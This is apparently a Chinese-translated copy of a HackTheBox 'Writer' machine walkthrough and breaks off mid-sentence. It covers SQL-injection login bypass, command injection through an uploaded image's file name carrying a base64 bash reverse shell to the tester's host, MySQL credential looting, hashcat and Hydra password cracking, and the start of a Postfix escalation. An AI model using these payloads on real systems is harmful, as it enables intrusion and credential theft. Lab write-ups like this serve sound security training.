<html>
<head>
<title>Writer from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">来自HackTheBox的编写器—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/writer-from-hackthebox-detailed-walkthrough-3d82582a7f2d?source=collection_archive---------2-----------------------#2021-10-17">https://infosecwriteups.com/writer-from-hackthebox-detailed-walkthrough-3d82582a7f2d?source=collection_archive---------2-----------------------#2021-10-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b2a8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="e1d8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/bd50d4ed463df9aa28603cb0bf24d2af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*RbPw2KT-ZBltv3ah.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">黑客盒子作者</figcaption></figure><p id="fe12" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Writer是HackTheBox上的一台中型机器。我们首先列举一个引导我们进入登录页面的网站，很容易绕过这个页面进入仪表板。调查显示上传图像的文件名没有被正确清理，所以我们使用它来获得一个反向外壳。我们找到了MySQL数据库的凭证，这反过来又给了我们一个用户散列。我们破解它，通过SSH连接，发现我们的升级路径是通过Postfix。这导致我们以第二个用户的身份连接，我们发现错误配置的权限允许我们利用conf.d文件夹以root用户的身份连接shell。</p><p id="fd42" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于一个中等的盒子来说，这是相当复杂的。所以我希望你和我一样喜欢它。</p><p id="e630" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">需要的技能是网络和操作系统枚举和使用打嗝来调查。学到的技能是对postfix的详细了解以及如何使用它。以及如何使用文件清理以及如何利用它。</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.com/home/machines/profile/361" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">侵入测试实验室</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.com</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="0004" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">初步侦察</h1><p id="7ce8" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/e8bb7de4a90330ea9ae3e813204b58e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fd4N55sE0VEkunuJ5IP-EA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><p id="f304" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有SSH、SMB和端口80上的网站。由于我们在Linux CTF上不经常看到SMB，所以我从那里开始，但首先将IP添加到我们主机的文件中:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="568c" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# echo "10.10.11.101 writer.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="53fb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SMBMap</h1><p id="dd81" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">现在让我们使用smbmap:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="fee5" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# smbmap -H writer.htb<br/>[+] IP: writer.htb:445  Name: unknown<br/>    Disk                 Permissions     Comment<br/>    ----                 -----------     -------<br/>    print$               NO ACCESS       Printer Drivers<br/>    writer2_project      NO ACCESS<br/>    IPC$                 NO ACCESS       IPC Service (writer server</span></pre><h1 id="6051" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Enum4Linux</h1><p id="8dfe" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">没有开放共享，用enum4linux看看吧:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9b74" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# enum4linux -a writer.htb                    <br/>Starting enum4linux v0.8.9 on Mon Oct 11 22:04:49 2021<br/><br/> ========================== <br/>|    Target Information    |<br/> ========================== <br/>Target ........... writer.htb<br/>RID Range ........ 500-550,1000-1050<br/>Username ......... ''<br/>Password ......... ''<br/>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br/> ================================================================ <br/>|  Users on writer.htb via RID cycling (RIDS: 500-550,1000-1050) |<br/> ================================================================ <br/>[I] Found new SID: S-1-22-1<br/>[I] Found new SID: S-1-5-21-1663171886-1921258872-720408159<br/>[I] Found new SID: S-1-5-32<br/>S-1-22-1-1000 Unix User\kyle (Local User)<br/>S-1-22-1-1001 Unix User\john (Local User)<br/>S-1-5-21-1663171886-1921258872-720408159-1000 WRITER\kyle (Local User)<br/><br/>enum4linux complete on Mon Oct 11 22:06:30 2021</span></pre><p id="150c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我砍掉了大部分输出，但是在上面我们看到两个用户已经找到了kyle和john。我让九头蛇尝试用rockyou wordlist破解这两个账户的密码。如果你想了解更多关于SSH强力的选项，这篇文章是非常有用的</p><p id="cfc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想让用户遵循预定的路径，那么就从这里开始。如果你想走更快更简单的路，向下滚动到更下面的部分。</p><h1 id="da16" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">预期路径</h1><p id="1c17" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">在运行的时候，我浏览了一下80端口的网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ni"><img src="../Images/f5e8cfe76ce2ad13de0772cbc6894919.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*_64Ia0QhVdXCH3fL.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">80端口上的writer.htb webtsite</figcaption></figure><h1 id="7781" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Feroxbuster</h1><p id="b3b8" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这是一个静态的博客，里面有很多乍看上去毫无新意的文章。我注意到在“关于”页面上有一个用户admin@writer.htb。让我们来看看Feroxbuster:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nj"><img src="../Images/863c202b5f4e5112b8be94ab2481aebf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AH5yDtb9oarMMvoD5Sx3cg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Ferroxbuster产量</figcaption></figure><p id="0a27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从列表中，我们看到文件夹/管理有200个响应，让我们看看:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/e9ecc6e4622e08318d8513e20121ddd0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/0*tJmF1RPPvNJcXo8C.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">管理员登录页面</figcaption></figure><h1 id="337a" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SQLi旁路</h1><p id="8703" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们有一个管理员登录页面。我尝试了一些不起作用的标准凭证，所以我使用了<a class="ae nh" href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet" rel="noopener ugc nofollow" target="_blank">这个</a> SQLi备忘单，看看我们是否可以绕过登录:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/e9d5fd12e8f06acb235628be879ee689.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/0*uxhd-UCHXzqRedm5.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">SQL旁路</figcaption></figure><p id="025f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这招奏效了，我来到了仪表盘前:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nl"><img src="../Images/bd30ab3c38171b2ce60cff0324881768.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9qp3Y2_dSQrBZGP9.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">管理仪表板</figcaption></figure><p id="ae9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">点击左边的三个破折号并选择Stories，我们将到达这里:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/92f084257ef745fffdc58aa3bc8597e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*fX8k4OK-jGoAICgc.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">故事页面</figcaption></figure><p id="622d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">点击第一篇文章右侧的编辑按钮，我们将进入以下页面:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nn"><img src="../Images/3ab56ff09a7f666abc6efc9ea133eeae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*negQiev1J2lTGsrf.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">编辑故事</figcaption></figure><p id="6bb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">浏览按钮让我们上传一张图片，尝试其他东西。jpg给出一个错误:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi no"><img src="../Images/8aa274c3033dfd78031958c0ef5ec1f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*NADTrRBtMYmM5ZcL.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">无效的文件扩展名</figcaption></figure><h1 id="51ae" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">图像文件处理</h1><p id="6586" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">然而，像. jpg.php这样的双文件扩展名也可以。所以表明它没有正确地净化输入。我们可以通过创建一个扩展名为jpg的空文件进行测试，然后在以下内容后添加注释:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="9903" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# touch 'test.jpg; `pencer`'</span></pre><p id="a3df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上传文件然后拦截打嗝，看看会发生什么:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi np"><img src="../Images/1ff735b55821c0b795bdbb47aa7dfbb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/0*StgQzLLxo69GJmoW.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">打嗝拦截</figcaption></figure><p id="c4a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到它在这一点上没有被剥离，如果我们转发请求，它似乎已经保存了文件。</p><p id="42df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回顾之前的Feroxbuster扫描，我们看到它找到了一个存放图像的文件夹，我们可以用curl查看里面:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nq"><img src="../Images/1992099d09872cc612effd1d28f474e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VB2-vlfcWfNrp7B6lX1_gg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">显示文件已上传的Curl输出</figcaption></figure><p id="dfb0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在底部看到了我最初的test.jpg，第二个文件在文件名后添加了单词，这样我们就知道成功上传后文件的最终位置。</p><p id="4283" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二部分花了我一段时间才弄明白，但是我们可以做的是使用image_url参数来执行代码。首先创建一个包含我们命令的字符串来连接一个反向shell，我只是使用了一个经典的PenTestMonkey:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="0a88" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# echo -n "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.27/1337 0&gt;&amp;1'" | base64<br/>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn</span></pre><p id="7922" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用了base64编码来避免上传时出现任何问题。</p><p id="3d30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在创建一个新的镜像文件，像我们之前测试的那样附加上我们的shell代码:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="e8ec" class="nc km iq my b gy nd ne l nf ng">touch 'pencer.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn | base64 -d | bash `;'</span></pre><p id="524c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面，我已经使用echo将编码的shell传递给base64 -d，将其解码回原始版本，然后传递给bash来执行它。</p><p id="dd55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要像以前一样通过浏览一个现有的故事并选择它，然后保存它来上传文件。我们可以再次检查它是用curl上传的:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a4ab" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# curl http://writer.htb/static/img/<br/>&lt;SNIP&gt;<br/>&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/unknown.gif" alt="[   ]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="pencer.jpg;%20%60echo%20YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn%20%7c%20base64%20-d%20%7c%20bash%20%60;"&gt;pencer.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNy8xMzM3IDA+JjEn | base64 -d | bash `;&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;2021-10-13 21:48  &lt;/td&gt;&lt;td align="right"&gt;  0 &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;</span></pre><p id="5e9c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我们再次上传附加了shell的图像，但这次在Burp中捕获它，并将路径添加到文件中:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/980e3e9e4d262123fa9fa3df1636cd68.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*7m-dRRlJZ_O603Bz.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">打嗝时操作</figcaption></figure><p id="bfc3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我们使用了之前制定的文件路径，并使用它将已经上传的图像添加到image_url部分。当您在Burp中单击Forward时，web服务器会执行添加的额外内容，因此请确保您有一个Netcat侦听器在您之前创建字符串时使用的端口上等待。</p><h1 id="3102" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">WWW-数据外壳</h1><p id="5ea0" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">上传后切换到netcat查看我们有一个shell连接:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="a0da" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.15.27] from (UNKNOWN) [10.10.11.101] 53962<br/>bash: cannot set terminal process group (1073): Inappropriate ioctl for device<br/>bash: no job control in this shell<br/>www-data@writer:/$</span></pre><p id="9f00" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们继续之前升级终端:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="743e" class="nc km iq my b gy nd ne l nf ng">www-data@writer:/$ which python<br/>which python<br/>www-data@writer:/$ which python3<br/>which python3<br/>/usr/bin/python3<br/><br/>www-data@writer:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>python3 -c 'import pty;pty.spawn("/bin/bash")'<br/><br/>www-data@writer:/$ ^Z<br/>zsh: suspended  nc -nlvp 1337<br/>┌──(root💀kali)-[~/htb/writer]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 1337<br/><br/>www-data@writer:/$ export TERM=xterm<br/>www-data@writer:/$ stty rows 52 cols 237</span></pre><p id="ff70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">环顾四周，我在/etc中找到了一个MySQL文件夹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="59a8" class="nc km iq my b gy nd ne l nf ng">www-data@writer:/etc/mysql$ ls -lsa<br/>4 drwxr-xr-x   2 root root 4096 May 18 15:51 conf.d<br/>4 -rwxr-xr-x   1 root root 1620 May  9 18:20 debian-start<br/>4 -rw-------   1 root root  261 May 18 15:51 debian.cnf<br/>4 -rw-r--r--   1 root root  972 May 19 12:34 mariadb.cnf<br/>4 drwxr-xr-x   2 root root 4096 May 18 15:51 mariadb.conf.d<br/>0 lrwxrwxrwx   1 root root   24 May 18 15:51 my.cnf -&gt; /etc/alternatives/my.cnf<br/><br/>www-data@writer:/etc/mysql$ cat my.cnf<br/>&lt;SNIP&gt;<br/><br/>[client]<br/>database = dev<br/>user = djangouser<br/>password = &lt;HIDDEN&gt;<br/>default-character-set = utf8</span></pre><h1 id="9af4" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">MySQL枚举</h1><p id="5199" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我使用creds枚举MySQL服务器来查找用户散列:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ns"><img src="../Images/4304f715f28e1febc90f93dc587d2150.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yh7HJonN9-WBPiEDBNtjcg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">MySQL数据库枚举</figcaption></figure><h1 id="e501" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">哈希卡特</h1><p id="9e48" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">让我们来破解它:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nt"><img src="../Images/9ba2c869a26626e7c63d98d88f8a76f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pz79IQsVAMUNM8nekfQbWg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">哈希标识它的名称</figcaption></figure><p id="afff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">启动hashcat和rockyou:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="93b7" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 10000        <br/>hashcat (v6.1.1) starting...<br/><br/>Dictionary cache built:<br/>* Filename..: /usr/share/wordlists/rockyou.txt<br/>* Passwords.: 14344392<br/>* Bytes.....: 139921507<br/>* Keyspace..: 14344385<br/>* Runtime...: 1 sec<br/><br/>&lt;HIDDEN&gt;<br/>                                                 <br/>Session..........: hashcat<br/>Status...........: Cracked<br/>Hash.Name........: Django (PBKDF2-SHA256)<br/>Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=<br/>Time.Started.....: Thu Oct 14 22:06:04 2021 (1 min, 5 secs)<br/>Time.Estimated...: Thu Oct 14 22:07:09 2021 (0 secs)<br/>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br/>Guess.Queue......: 1/1 (100.00%)<br/>Speed.#1.........:      157 H/s (18.67ms) @ Accel:256 Loops:512 Thr:1 Vec:8<br/>Recovered........: 1/1 (100.00%) Digests<br/>Progress.........: 10240/14344385 (0.07%)<br/>Rejected.........: 0/10240 (0.00%)<br/>Restore.Point....: 9216/14344385 (0.06%)<br/>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259584-259999<br/>Candidates.#1....: rubberducky -&gt; 1asshole<br/><br/>Started: Thu Oct 14 22:04:54 2021<br/>Stopped: Thu Oct 14 22:07:09 2021</span></pre><p id="99bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">几分钟后我们得到了凯尔的密码。</p><h1 id="7f35" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">容易的道路</h1><p id="24da" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们不需要费那么大力气去获取凯尔的密码，我们可以直接强行破解。下面是我在演练开始时设置Hydra的情况:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nu"><img src="../Images/e55c6bdd0c3ec695aa847fa7587aed75.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WlAtlmGPcGoUSga1fPWY0w.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">九头蛇SSH密码破解</figcaption></figure><h1 id="9270" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">水螅</h1><p id="735b" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">是的，20分钟后，它让我到达了预定路径上所有工作的同一点！当然，我们是来学习的，所以希望你用了正确的方法。</p><h1 id="e1fc" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户Kyle访问</h1><p id="cd48" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">有了Kyle的密码，我们现在可以通过SSH登录:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f30d" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/writer]<br/>└─# ssh kyle@writer.htb        <br/>ECDSA key fingerprint is SHA256:GX5VjVDTWG6hUw9+T11QNDaoU0z5z9ENmryyyroNIBI.<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added 'writer.htb,10.10.11.101' (ECDSA) to the list of known hosts.<br/>kyle@writer.htb's password: <br/>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)<br/><br/>Last login: Mon Oct 11 15:31:14 2021 from 10.10.14.202<br/>kyle@writer:~$</span></pre><p id="dd71" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">先抢旗:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="7e2f" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ cat user.txt <br/>&lt;HIDDEN&gt;</span></pre><p id="1f5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在检查用户，我们看到一个名为过滤器的组:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="07c4" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ id<br/>uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)</span></pre><h1 id="aa93" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">利用后缀</h1><p id="ee6a" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">我们可以搜索该组可以访问哪些文件:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="520b" class="nc km iq my b gy nd ne l nf ng">kyle@writer:~$ find / -group filter -type f 2&gt;/dev/null<br/>/etc/postfix/disclaimer<br/><br/>kyle@writer:~$ file /etc/postfix/disclaimer<br/>/etc/postfix/disclaimer: POSIX shell script, ASCII text executable<br/><br/>kyle@writer:~$ cat /etc/postfix/disclaimer<br/>#!/bin/sh<br/># Localize these.<br/>INSPECT_DIR=/var/spool/filter<br/>SENDMAIL=/usr/sbin/sendmail<br/><br/># Get disclaimer addresses<br/>DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses<br/><br/># Exit codes from &lt;sysexits.h&gt;<br/>EX_TEMPFAIL=75<br/>EX_UNAVAILABLE=69<br/>&lt;SNIP&gt;</span></pre><p id="b03d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该文件与Ubuntu的默认邮件传输代理<a class="ae nh" href="https://ubuntu.com/server/docs/mail-postfix" 